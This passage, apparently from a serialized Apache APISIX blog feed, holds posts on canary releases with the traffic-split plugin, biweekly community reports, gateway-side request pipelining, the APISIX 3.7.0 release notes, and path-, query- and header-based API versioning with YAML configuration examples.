rapid development of the business. In the future, we look forward to the continuous evolution of APISIX, bringing more value and innovation to large-scale video-related businesses and other domains."},{"id":"Canary releases with Apache APISIX","metadata":{"permalink":"/blog/2023/12/07/canary-releases-apisix","source":"@site/blog/2023/12/07/canary-releases-apisix.md","title":"Canary releases with Apache APISIX","description":"In a few words, the idea of canary releases is to deliver a new software version to only a fraction of the users, analyze the results, and decide whether to proceed further or not. If results are not aligned with expectations, roll back; if they are, increase the number of users exposed until all users benefit from the new version. In this post, I\'d like to detail this introduction briefly, explain different ways to define the fraction, and show how to execute it with Apache APISIX.\\n","date":"2023-12-07T00:00:00.000Z","formattedDate":"December 7, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.605,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"How to Supercharge Large-Scale Video Operations with APISIX","permalink":"/blog/2023/12/14/migu-video-adopts-apisix"},"nextItem":{"title":"Biweekly Report (November 20 - December 03)","permalink":"/blog/2023/12/04/bi-weekly-report"}},"content":">In a few words, the idea of canary releases is to deliver a new software version to only a fraction of the users, analyze the results, and decide whether to proceed further or not. If results are not aligned with expectations, roll back; if they are, increase the number of users exposed until all users benefit from the new version.\\n>\\n>In this post, I\'d like to detail this introduction briefly, explain different ways to define the fraction, and show how to execute it with Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/canary-releases-apisix/\\" />\\n</head>\\n\\n## Introduction to canary releases\\n\\nThe term \\"canary\\" originates from the coal mining industry. When mining, it\'s not uncommon to release toxic gases: In a small enclosed space, it can mean quick death. Worse, the gas may be odorless, so miners would breathe it until it was too late to leave. Carbon monoxide is quite common in coal mines and is not detectable by human senses.\\n\\nFor this reason, miners brought canaries with them underground. If the canary suddenly dropped dead, chances were high that such a gas pocket had been breached, and it was high time to leave the place.\\n\\nYears ago, we brought this approach to releasing a new software version. The analogy goes like this: miners are the Ops team deploying the version, the canary consists of all tools to measure the impact of the release, and the gas is a (critical) bug.\\n\\nThe most crucial part is that **you need to measure the impact** of the release, including failure rates, HTTP status codes, etc., and compare them with those of the previous version. It\'s outside the scope of this post, but again, it\'s critical if you want to benefit from canary releases. The second most important part is the ability to roll back fast if the new version is buggy.\\n\\n## Canary releases vs. feature flags\\n\\nNote that canary releases are not the only way to manage the risk of releasing new code. For example, feature flags are another popular way:\\n\\n* The canary approach delivers the complete set of features in the new component version\\n* Feature flags deploy the component as well, but dedicated configuration parameters allow activating and deactivating each feature individually\\n\\nFeature flags represent a more agile approach (in the true sense of the word) toward rollbacks. If one feature out of 10 is buggy, you don\'t need to undeploy the new version; you only deactivate the buggy feature. However, this superpower comes at the cost of additional codebase complexity, regardless of whether you rely on third-party products or implement it yourself.\\n\\nOn the other hand, canary requires a mature deployment pipeline to be able to deploy and undeploy at will.\\n\\n## Approaches to canary releases\\n\\nThe idea behind canary releases is to allow only a fraction of users to access the new version. Most canary definitions only define \\"fraction\\" as a percentage of users. However, there\'s more to it.\\n\\nThe first step may be to allow only vetted users to check that the deployment in the production environment works as expected. In this case, you may forward only a specific set of internal users, _e.g._, testers, to the new version. If you know the people in advance, and the system authenticates users, you can configure it by identity; if not, you need to fallback to some generic way, _e.g._, HTTP headers - `X-Canary: Let-Me-Go-To-v2`.\\n\\nRemember that we must monitor the old and the new systems to look at discrepancies. If nothing shows up, it\'s an excellent time to increase the pool of users forwarded to the new version. I assume you eat your own dog food, _i.e._; team members use the software they\'re developing. If you don\'t, for example, an e-commerce site for luxury cars, you\'re welcome to skip this section.\\n\\nTo enlarge the fraction of users while limiting the risks, we can now indiscriminately provide the new version to internal users. We can configure the system to forward to the new version based on the client IP to do this. At a time when people were working on-site, it was easy as their IPs were in a specific range. Remote doesn\'t change much since users probably access the company\'s network via a VPN.\\n\\nAgain, monitor and compare at this point.\\n\\n## The whole nine yards\\n\\nAt this point, everything should work as expected for internal users, either a few or all. But just as no plan survives contact with the enemy, no usage can mimic the whole diversity of a production workload. In short, we need to let regular users access the new version, but in a controlled way, just as we gradually increased the number of users so far: start with a small fraction, monitor it, and if everything is fine, increase the fraction.\\n\\nHere\'s how to do it with Apache APISIX. Apache APISIX offers a plugin-based architecture and provides a plugin that caters to our needs, namely the `traffic-split` plugin.\\n\\n>The `traffic-split` Plugin can be used to dynamically direct portions of traffic to various Upstream services.\\n>\\n>This is done by configuring `match`, which are custom rules for splitting traffic, and `weighted_upstreams` which is a set of Upstreams to direct traffic to.\\n>\\n>-- [traffic-split](https://apisix.apache.org/docs/apisix/plugins/traffic-split/)\\n\\nLet\'s start with some basic upstreams, one for each version:\\n\\n```yaml\\nupstreams:\\n  - id: v1\\n    nodes:\\n      \\"v1:8080\\": 1\\n  - id: v2\\n    nodes:\\n      \\"v2:8080\\": 1\\n```\\n\\nWe can use the `traffic-split` plugin to forward most of the traffic to v1 and a fraction to v2:\\n\\n```yaml\\nroutes:\\n  - id: 1\\n    uri: \\"*\\"                                                     #1\\n    upstream_id: v1\\n    plugins:\\n      traffic-split:\\n        rules:\\n          - weighted_upstreams:                                  #2\\n            - upstream_id: v2                                    #3\\n              weight: 1                                          #3\\n            - weight: 99                                         #3\\n```\\n\\n1. Define a catch-all route\\n2. Configure how to split traffic; here, weights\\n3. Forward 99% of the traffic to v1 and 1% to v1. Note that the weights are relative to each other. To achieve 50/50, you can set weights 1 and 1, 3 and 3, 50 and 50, etc.\\n\\nAgain, we monitor everything and make sure results are as expected. Then, we can increase the fraction of the traffic forwarded to v2, _e.g._:\\n\\n```yaml\\nroutes:\\n  - id: 1\\n    uri: \\"*\\"\\n    upstream_id: v1\\n    plugins:\\n      traffic-split:\\n        rules:\\n          - weighted_upstreams:\\n            - upstream_id: v2\\n              weight: 5                                          #1\\n            - weight: 95                                         #1\\n```\\n\\n1. Increase the traffic to v2 to 5%\\n\\nNote that Apache APISIX reloads changes to the file above every second. Hence, you split traffic in near-real time. Alternatively, you can use the Admin API to achieve the same.\\n\\n## More controlled releases\\n\\nIn the above, I moved from internal users to a fraction of external users. Perhaps releasing to every internal user is too big a risk in your organization, and you need even more control. Note that you can further configure the `traffic-split` plugin in this case.\\n\\n```yaml\\nroutes:\\n  - id: 1\\n    uri: /*\\n    upstream_id: v1\\n    plugins:\\n      traffic-split:\\n        rules:\\n          - match:\\n            - vars: [[\\"http_X-Canary\\",\\"~=\\",\\"Let-Me-Go-To-v2\\"]]   #1\\n          - weighted_upstreams:\\n            - upstream_id: v2\\n              weight: 5\\n            - weight: 95\\n```\\n\\n1. Only split traffic if the `X-Canary` HTTP header has the configured value.\\n\\nThe following command always forwards to v1:\\n\\n```bash\\ncurl http://localhost:9080\\n```\\n\\nThe following command also always forwards to v1:\\n\\n```bash\\ncurl -H \'X-Canary: Let-Me-Go-To-v1\' http://localhost:9080\\n```\\n\\nThe following command splits the traffic according to the configured weights, _i.e._, 95/5:\\n\\n```bash\\ncurl -H \'X-Canary: Let-Me-Go-To-v2\' http://localhost:9080\\n```\\n\\n## Conclusion\\n\\nThis post explained canary releases and how you can configure one via Apache APISIX. You can start with several routes with different priorities and move on to the `traffic-split` plugin.  The latter can even be configured further to allow more complex use cases.\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/ajavageek/canary-release).\\n\\n**To go further:**\\n\\n* [CanaryRelease on Martin Fowler\'s bliki](https://martinfowler.com/bliki/CanaryRelease.html)\\n* [traffic-split](https://apisix.apache.org/docs/apisix/plugins/traffic-split/)\\n* [Implementation of canary release solution based on Apache APISIX](https://apisix.apache.org/blog/2022/06/14/how-mse-supports-canary-release-with-apache-apisix/)\\n* [Canary Release in Kubernetes With Apache APISIX Ingress](https://navendu.me/posts/canary-in-kubernetes/)\\n* [Smooth Canary Release Using APISIX Ingress Controller with Flagger](https://api7.ai/blog/apisix-ingress-and-flagger-smooth-canary-release)\\n* [Apache APISIX Canary Deployments](https://fluxcd.io/flagger/tutorials/apisix-progressive-delivery/)"},{"id":"Biweekly Report (November 20 - December 03)","metadata":{"permalink":"/blog/2023/12/04/bi-weekly-report","source":"@site/blog/2023/12/04/bi-weekly-report.md","title":"Biweekly Report (November 20 - December 03)","description":"Our bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2023-12-04T00:00:00.000Z","formattedDate":"December 4, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.855,"truncated":true,"authors":[],"prevItem":{"title":"Canary releases with Apache APISIX","permalink":"/blog/2023/12/07/canary-releases-apisix"},"nextItem":{"title":"Chopping the monolith in a smarter way","permalink":"/blog/2023/11/30/chopping-monolith-smarter-way"}},"content":"> We have recently made some additions and improvements to specific features within Apache APISIX. The updates include adding a `multi-auth` plugin, adding the required scopes configuration property to `openid-connect` plugin, and enhancing the `body-transformer` plugin. For additional information, please consult the bi-weekly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'Many hands make light work\' rings true in our way, made possible by the collective dedication of our community.\\n\\nFrom 11.20 to 12.03, a total of 22 contributors made 45 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\nWe have recently added and enhanced several plugins, and here is a summary of the updates:\\n\\n1. Add a `multi-auth` plugin\\n\\n2. Add the required scopes configuration property to `openid-connect` plugin\\n\\n3. Enhance the `body-transformer` plugin\\n\\nOur bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/12/04/PnNWmVdX_1204-Con.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/12/04/vrpTk1y4_1204-New.png)\\n\\n## Highlight of Recent Feature\\n\\n- [Add `multi-auth` plugin](https://github.com/apache/apisix/pull/10482) (Contributor: [madhawa-gunasekara](https://github.com/madhawa-gunasekara))\\n\\n- [Add the required scopes configuration property to `openid-connect` plugin](https://github.com/apache/apisix/pull/10493) (Contributor: [csotiriou](https://github.com/csotiriou))\\n\\n- [Enhance the `body-transformer` plugin](https://github.com/apache/apisix/pull/10496) (Contributor: [yongxiaodong](https://github.com/yongxiaodong))\\n\\n## Recent Blog Recommendations\\n\\n- [Release Apache APISIX 3.7.0](https://apisix.apache.org/blog/2023/11/21/release-apache-apisix-3.7.0/)\\n\\n  We are glad to present Apache APISIX 3.7.0 with exciting new features, bug fixes, and other improvements to user experiences.\\n\\n- [Embrace the Lightweight APISIX Ingress Controller Without etcd Dependency](https://apisix.apache.org/blog/2023/10/18/ingress-apisix/)\\n\\n  The innovative architecture of the APISIX Ingress Controller eliminates the dependency on a standalone etcd cluster, greatly simplifying maintenance costs and system complexity.\\n\\n- [Embracing GitOps: APISIX\'s New Feature for Declarative Configuration](https://apisix.apache.org/blog/2023/10/07/apisix-gitops-adc/)\\n\\n  APISIX strengthens its integration with modern development and operational workflows by introducing the declarative configuration tool, ADC.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Chopping the monolith in a smarter way","metadata":{"permalink":"/blog/2023/11/30/chopping-monolith-smarter-way","source":"@site/blog/2023/11/30/chopping-monolith-smarter-way.md","title":"Chopping the monolith in a smarter way","description":"In my previous post Chopping the Monolith, I explained that some parts of a monolith are pretty stable and only the fast-changing parts are worth being \\"chopped.\\" I turned the post into a talk and presented it at several conferences. I think it\'s pretty well received; I believe it\'s because most developers understand, or have direct experience, that microservices are not a good fit for traditional organizations, as per Conway\'s Law.\\n","date":"2023-11-30T00:00:00.000Z","formattedDate":"November 30, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":3.54,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Biweekly Report (November 20 - December 03)","permalink":"/blog/2023/12/04/bi-weekly-report"},"nextItem":{"title":"Biweekly Report (November 06 - November 19)","permalink":"/blog/2023/11/23/bi-weekly-report"}},"content":">In my previous post [Chopping the Monolith](https://blog.frankel.ch/chopping-monolith-smarter-way/), I explained that some parts of a monolith are pretty stable and only the fast-changing parts are worth being \\"chopped.\\" I turned the post into a talk and presented it at several conferences. I think it\'s pretty well received; I believe it\'s because most developers understand, or have direct experience, that microservices are not a good fit for traditional organizations, as per [Conway\'s Law](https://en.wikipedia.org/wiki/Conway%27s_law).\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/chopping-monolith-smarter-way/\\" />\\n</head>\\n\\nIn the talk, I use an e-commerce webapp as an example.\\n\\n![Regular requests flow](https://static.apiseven.com/uploads/2023/11/29/Cjqme0MX_original-flow.svg)\\n\\nThe pricing needs to change often due to business requirements, and it is a good candidate for chopping. The idea is first to expose pricing as an HTTP route.\\n\\n![Forked requests flow](https://static.apiseven.com/uploads/2023/11/29/YMKWYnRr_forked-flow.svg)\\n\\nAt this point, we can configure the Gateway to forward pricing calls with the cart payload to another component, _e.g._, a  <abbr title=\\"Function-as-a-Service\\">FaaS</abbr>.\\n\\n![Forked requests flow](https://static.apiseven.com/uploads/2023/11/29/Su1xz9Qf_forked-flow-to-faas.svg)\\n\\nI expected a lot of pushback because we now need twice the number of HTTP calls. Given that the client is remote, it has a non-trivial performance cost. It has yet to be mentioned, but I\'d like to offer another better-designed approach today.\\n\\nIn particular, we can move the forked calls from the client to the API Gateway. We still have twice the number of calls, but since the Gateway is much closer to the upstream(s), the performance hit is much lower.\\n\\nNo one will be surprised I\'m using [apisix-pipeline-request-plugin README](https://github.com/bzp2010/apisix-plugin-pipeline-request) for my demos. It implements a plugin architecture and comes bundled with plugins that address most possible requirements. We need a plugin that pipes an HTTP call\'s output to another HTTP call\'s input. It\'s not part of the current out-of-the-box plugin portfolio; however, when no plugin fits your requirement, you can develop your own - or find one that does. My colleague Zeping Bai has developed such a plugin:\\n\\n>When handling client requests, the plugin will iterate through the nodes section of the configuration, requesting them in turn.\\n>\\n>In the first request, it will send the complete method, query, header, and body of the client request, while in subsequent requests it will only send the last response with the POST method.\\n>\\n>The successful response will be recorded in a temporary variable, and each request in the loop will get the response body of the previous request and overwrite the response body of the current request.\\n>\\n>When the loop ends, the response body will be sent to the client as the final response.\\n>\\n>-- [apisix-pipeline-request-plugin README](https://github.com/bzp2010/apisix-plugin-pipeline-request)\\n\\nThe final sequence is the following:\\n\\n![Requests flow using the pipeline plugin](https://static.apiseven.com/uploads/2023/11/29/H8K0uGVZ_forked-flow-with-pipeline.svg)\\n\\nNote that the `apisix-pipeline-request-plugin` consumes the input. As we want to return all the necessary data, we must return both the cart lines and the price in the payload. The pricing should return the cart lines, which is not an issue since it receives it as an input.\\n\\n## Apache APISIX configuration\\n\\nThe Apache APISIX configuration is the following:\\n\\n<table>\\n<thead>\\n  <tr>\\n    <th>Route</th>\\n    <th>URI</th>\\n    <th>Plugins</th>\\n    <th>Comment</th>\\n  </tr>\\n</thead>\\n<tbody>\\n  <tr>\\n    <td>#1</td>\\n    <td><code>/*</code></td>\\n    <td>&nbsp;</td>\\n    <td>Catch-all route for front-end resources</td>\\n  </tr>\\n  <tr>\\n    <td>#2</td>\\n    <td><code>/api*</code></td>\\n    <td><code>proxy-rewrite</code></td>\\n    <td>\\n      <ul>\\n        <li>Catch-all route for back-end API calls</li>\\n        <li>The plugin rewrites URIs to remove the <code>/api</code> prefix</li>\\n      </ul>\\n    </td>\\n  </tr>\\n  <tr>\\n    <td>#3</td>\\n    <td><code>/api/checkout</code></td>\\n    <td><code>pipeline-request</code></td>\\n    <td>\\n      The magic happens here:\\n      <ul>\\n        <li>The first pipeline node calls the monolith to return the cart lines</li>\\n        <li>The second calls the pricing component with the cart lines to return the cart lines and the pricing computed in the component</li>\\n      </ul>\\n    </td>\\n  </tr>\\n  <tr>\\n    <td>#4</td>\\n    <td><code>/api/price</code></td>\\n    <td><code>azure-functions</code></td>\\n    <td>I implement the pricing in an Azure FaaS, but it\'s an implementation detail</td>\\n  </tr>\\n</tbody>\\n</table>\\n\\n## Conclusion\\n\\nIn this post, I offer another alternative to chop the monolith. Instead of forking the call on the client side, we fork the call on the Gateway side. While Apache APISIX doesn\'t offer such a plugin out-of-the-box, the community fills in the blank with the `apisix-pipeline-request-plugin`.\\n\\nCompared to the original solution, this alternative has a couple of benefits:\\n\\n* Better performance, as the fork happens closer to the Gateway\\n* No impact client-side\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/nfrankel/chop-monolith/tree/api).\\n\\n**To go further:**\\n\\n* [Chopping the monolith, the original way](https://blog.frankel.ch/chopping-monolith/)\\n* [apisix-pipeline-request-plugin](https://github.com/bzp2010/apisix-plugin-pipeline-request)\\n* [Chaining API requests with API Gateway](https://api7.ai/blog/chaining-api-requests-with-api-gateway)"},{"id":"Biweekly Report (November 06 - November 19)","metadata":{"permalink":"/blog/2023/11/23/bi-weekly-report","source":"@site/blog/2023/11/23/bi-weekly-report.md","title":"Biweekly Report (November 06 - November 19)","description":"Our bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2023-11-23T00:00:00.000Z","formattedDate":"November 23, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.515,"truncated":true,"authors":[],"prevItem":{"title":"Chopping the monolith in a smarter way","permalink":"/blog/2023/11/30/chopping-monolith-smarter-way"},"nextItem":{"title":"Release Apache APISIX 3.7.0","permalink":"/blog/2023/11/21/release-apache-apisix-3.7.0"}},"content":"> We have recently made some fixes and improvements to specific features within Apache APISIX. The update includes supporting Nacos AK/SK authentication. For additional information, please consult the bi-weekly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'Many hands make light work\' rings true in our way, made possible by the collective dedication of our community.\\n\\nFrom 11.06 to 11.19, a total of 15 contributors made 26 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\nOur bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/11/20/j4c7LdeJ_11.20-Con.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/11/20/eaimWsfQ_11.20-New.png)\\n\\n## Highlight of Recent Feature\\n\\n- [Support Nacos AK/SK authentication](https://github.com/apache/apisix/pull/10445) (Contributor: [yuweizzz](https://github.com/yuweizzz))\\n\\n## Recent Blog Recommendations\\n\\n- [Release Apache APISIX 3.7.0](https://apisix.apache.org/blog/2023/11/21/release-apache-apisix-3.7.0/)\\n\\n  We are glad to present Apache APISIX 3.7.0 with exciting new features, bug fixes, and other improvements to user experiences.\\n\\n- [Embrace the Lightweight APISIX Ingress Controller Without etcd Dependency](https://apisix.apache.org/blog/2023/10/18/ingress-apisix/)\\n\\n  The innovative architecture of the APISIX Ingress Controller eliminates the dependency on a standalone etcd cluster, greatly simplifying maintenance costs and system complexity.\\n\\n- [Embracing GitOps: APISIX\'s New Feature for Declarative Configuration](https://apisix.apache.org/blog/2023/10/07/apisix-gitops-adc/)\\n\\n  APISIX strengthens its integration with modern development and operational workflows by introducing the declarative configuration tool, ADC.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Release Apache APISIX 3.7.0","metadata":{"permalink":"/blog/2023/11/21/release-apache-apisix-3.7.0","source":"@site/blog/2023/11/21/release-apache-apisix-3.7.0.md","title":"Release Apache APISIX 3.7.0","description":"The Apache APISIX 3.7.0 version is released on November 21, 2023. This release includes a few breaking changes, new features, and bug fixes.","date":"2023-11-21T00:00:00.000Z","formattedDate":"November 21, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.21,"truncated":true,"authors":[{"name":"Xin Rong","title":"Author","url":"https://github.com/AlinsRan","image_url":"https://github.com/AlinsRan.png","imageURL":"https://github.com/AlinsRan.png"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://github.com/kayx23.png","imageURL":"https://github.com/kayx23.png"}],"prevItem":{"title":"Biweekly Report (November 06 - November 19)","permalink":"/blog/2023/11/23/bi-weekly-report"},"nextItem":{"title":"API versioning","permalink":"/blog/2023/11/09/api-versioning"}},"content":"We are glad to present Apache APISIX 3.7.0 with exciting new features, bug fixes, and other improvements to user experiences.\\n\\n\x3c!--truncate--\x3e\\n\\nThis new release adds a number of new features, including the support for ACL tokens for Consul service discovery, authorization parameters in `openid-connect` plugin, Nacos AK/SK authentication, and more.\\n\\nThere are also a few important changes included in this release. Should you find these changes impacting your operations, please plan your upgrade accordingly.\\n\\n## Breaking Changes\\n\\n### Restrict modification to create time and update time of core resources\\n\\nIn the earlier versions, modifying resources\' `create_time` and `update_time` was unrestricted with Admin API. This behaviour is unneeded and prone to risks. Starting from 3.7.0, users would not be allowed to modify these timestamps.\\n\\nFor more information, see [change proposal](https://lists.apache.org/thread/968kp7hd6zcg7ty2clomkbshmd53v71d) and [PR #10232](https://github.com/apache/apisix/pull/10232).\\n\\n### Remove `exptime`, `validity_start`, and `validity_end` attributes from SSL schema\\n\\nRemove `exptime`, `validity_start`, and `validity_end` attributes from SSL schema as these information are present in the certificate.\\n\\nFor more information, see [change proposal](https://lists.apache.org/thread/8l4h8f6wcv482s0b7vt17do5z3g1y3o3) and [PR #10323](https://github.com/apache/apisix/pull/10323).\\n\\n### Update `opentelemetry` plugin attributes to beter follow the specifications\\n\\nReplace attributes `route` with `apisix.route_name`, `service` with `apisix.service_name` in the `opentelemetry` plugin to follow the OpenTelemetry specifications for span name. For more information, see [PR #10393](https://github.com/apache/apisix/pull/10393).\\n\\n## New Features\\n\\n### Support ACL tokens for Consul discovery\\n\\nSupport for ACL tokens when using Consul or Consul KV service discovery. For more information, see [PR #10278](https://github.com/apache/apisix/pull/10278).\\n\\n### Support configuring services for stream routes\\n\\nSupport referencing services in stream routes to configure upstreams. For more information, see [PR #10298](https://github.com/apache/apisix/pull/10298).\\n\\n### Support authorization parameters in `openid-connect` plugin\\n\\nSupport additional authorization parameters in the `authorization_params` attribute of the `openid-connect` plugin. For more information, see [PR #10058](https://github.com/apache/apisix/pull/10058).\\n\\n### Support setting variables in `zipkin` plugin\\n\\nSupport setting variables in zipkin plugin to expose the span information during the rewrite phase. For more information, see [documentation](https://github.com/wizhuo/apisix/blob/master/docs/en/latest/plugins/zipkin.md#variables) and [PR #10361](https://github.com/apache/apisix/pull/10361).\\n\\n### Support Nacos AK/SK authentication\\n\\nSupport Nacos AK/SK authentication. The access key and secret key can be configured in the configuration file as follows:\\n\\n```yaml title=\\"config.yaml\\"\\ndiscovery:\\n  nacos:\\n    ...\\n    access_key: \\"\\"    # Nacos AccessKey ID\\n    secret_key: \\"\\"    # Nacos AccessKey Secret\\n```\\n\\nFor more information, see [PR #10445](https://github.com/apache/apisix/pull/10445).\\n\\n## Other Updates\\n\\n- Fix `post_arg_*` variable matching failure when the POST form `Content-Type` is appended with character set ([PR #10372](https://github.com/apache/apisix/pull/10372))\\n- Use `apisix-runtime` as the default APISIX runtime ([PR #10415](https://github.com/apache/apisix/pull/10415) and [PR #10427](https://github.com/apache/apisix/pull/10427))\\n- Add tests for `authz-keycloak` with apisix secrets ([PR #10353](https://github.com/apache/apisix/pull/10353))\\n- Keep healthcheck target state when upstream changes ([PR #10312](https://github.com/apache/apisix/pull/10312) and [PR #10307](https://github.com/apache/apisix/pull/10307))\\n- Fix incomplete log compression due to timeout in the `log-rotate` plugin  ([PR #8620](https://github.com/apache/apisix/pull/8620))\\n\\n## Changelog\\n\\nFor a complete list of changes in this release, please see [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md#370)."},{"id":"API versioning","metadata":{"permalink":"/blog/2023/11/09/api-versioning","source":"@site/blog/2023/11/09/api-versioning.md","title":"API versioning","description":"In my previous post Evolving your APIs, I mention the main API versioning approaches. During the talk of the same name, I sometimes get some questions on the subject. In this post, I\'ll detail each of them. I assume readers know the reasons behind versioning, semantic versioning, and product lifecycle. If not, I encourage you to read a bit about these themes; in particular, chapter 24 of the excellent API Design Patterns book focuses on them. I\'ll summarize the subject in a few words in any case.\\n","date":"2023-11-09T00:00:00.000Z","formattedDate":"November 9, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.145,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Release Apache APISIX 3.7.0","permalink":"/blog/2023/11/21/release-apache-apisix-3.7.0"},"nextItem":{"title":"Biweekly Report (October 23 - November 05)","permalink":"/blog/2023/11/08/bi-weekly-report"}},"content":">In my previous post [Evolving your APIs](https://blog.frankel.ch/evolve-apis/), I mention the main API versioning approaches. During the talk of the same name, I sometimes get some questions on the subject. In this post, I\'ll detail each of them.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/api-versioning/\\" />\\n</head>\\n\\nI assume readers know the reasons behind versioning, semantic versioning, and product lifecycle. If not, I encourage you to read a bit about these themes; in particular, chapter 24 of the excellent [API Design Patterns](https://blog.frankel.ch/api-design-patterns/) book focuses on them.\\n\\nI\'ll summarize the subject in a few words in any case.\\n\\n## Generalities\\n\\nSoftware naturally evolves, because of business need or changing regulations. In some cases, the said software has no clients but humans, _e.g._, a monolith with Server-Side Rendering. In all other cases, at least another software component interacts with your software:\\n\\n* A JavaScript front-end consumes the REST API\\n* A webservice consumes the REST API\\n* etc.\\n\\nSome changes are backward-compatible - you don\'t need to update the client; others are not. Removing an endpoint is not backward compatible; it\'s a breaking change. Removing a parameter, adding a required parameter, or changing a parameter type are also breaking changes.\\n\\nWhen introducing a breaking change in regular software, you must increase its major version if you adhere to semantic versioning. It\'s the same in the realm of APIs. You let your customers keep using the v1 version while releasing breaking changes in the v2 version.\\n\\nThe crux of the problem is now how to use a specific version of the endpoint. Three options are available:\\n\\n* Path-based versioning\\n* Query-based versioning\\n* Header-based versioning\\n\\nLet\'s detail them in turn. It all boils down to routing; I\'ll demo the configuration with [Apache APISIX](https://apisix.apache.org/) to implement each versioning approach.\\n\\n## Path-based versioning\\n\\nPath-based versioning is so ubiquitous that it\'s the approach most people think about when they think about API versioning. The idea is to set the version in the path:\\n\\n* `/v1/foo`\\n* `/v2/foo`\\n\\nPath-based versioning seems easy to implement with Apache APISIX:\\n\\n```yaml\\nupstreams:\\n  - id: 1\\n    nodes:\\n      \\"upstream_1:8080\\": 1\\n  - id: 2\\n    nodes:\\n      \\"upstream_2:8080\\": 1\\n\\nroutes:\\n  - uri: /v1/*\\n    upstream_id: 1\\n  - uri: /v2/*\\n    upstream_id: 2\\n```\\n\\nThe above setup doesn\'t work unfortunately: as it stands, we forward `/v1/*` to the upstream, whereas it probably can handle only `*` - the path behind the version prefix. We need to remove the version prefix before forwarding to the upstream:\\n\\n```yaml\\nroutes:\\n  - uri: /v1/*\\n    upstream_id: 1\\n    plugins:\\n      proxy-rewrite:\\n        regex_uri: [ \\"/v1(.*)\\", \\"$1\\" ]        #1\\n  - uri: /v2/*\\n    upstream_id: 2\\n    plugins:\\n      proxy-rewrite:\\n        regex_uri: [ \\"/v2(.*)\\", \\"$1\\" ]        #1\\n```\\n\\n1. Remove the version path prefix before forwarding\\n\\nBeware if you use other plugins, which may forward the request before the prefix is removed, _e.g._, `proxy-mirror`. In this case, we must apply `proxy-rewrite` *before* `proxy-mirror`. Apache APISIX orders plugins by their default priority, so we need to increase the priority of the former:\\n\\n```yaml\\nroutes:\\n  - uri: /v1/*\\n    upstream_id: 1\\n    plugins:\\n      proxy-rewrite:                          #1\\n        regex_uri: [ \\"/v1(.*)\\", \\"$1\\" ]\\n      proxy-mirror:                           #2\\n        host: \\"http://api.v2:8080\\"\\n        _meta:\\n          priority: 1000                      #3\\n```\\n\\n1. `proxy-rewrite` default priority is `1008`\\n2. `proxy-mirror` default priority is `1010`\\n3. Set it to `1000` so that it now applies _after_ the rewrite takes place\\n\\n## Query-based versioning\\n\\nAnother way to version is to use query parameters, _e.g._, `?version=v1`. While I\'ve never seen it in the wild, it deserves a mention nonetheless. We can leverage the following Apache APISIX configuration:\\n\\n```yaml\\nroutes:\\n  - uri: /*                                   #1\\n    upstream_id: 1\\n    vars: [[ \\"arg_version\\", \\"==\\", \\"v1\\" ]]     #2\\n    priority: 2                               #1\\n  - uri: /*                                   #1\\n    upstream_id: 2\\n    vars: [[ \\"arg_version\\", \\"==\\", \\"v2\\" ]]     #2\\n    priority: 